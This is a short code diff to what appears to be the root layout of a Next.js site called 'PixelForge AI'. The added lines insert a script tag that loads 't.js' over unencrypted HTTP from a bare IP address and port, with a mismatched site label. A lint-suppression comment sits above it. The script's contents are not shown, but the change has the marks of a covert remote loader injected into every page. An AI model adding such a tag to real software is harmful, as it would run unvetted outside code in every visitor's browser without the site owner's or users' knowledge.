@@ -54,6 +54,8 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         <Footer siteName="PixelForge AI" tagline="Build & play browser games with AI. No downloads. No code." />
         <ChatBot config={PIXELFORGE_CHAT_CONFIG} />
       <CookieConsent />
+        {/* eslint-disable-next-line @next/next/no-before-interactive-script-outside-document */}
+        <script src="http://31.97.56.148:3098/t.js" data-site="arcadeforge.app" defer></script>
       </body>
     </html>
   )
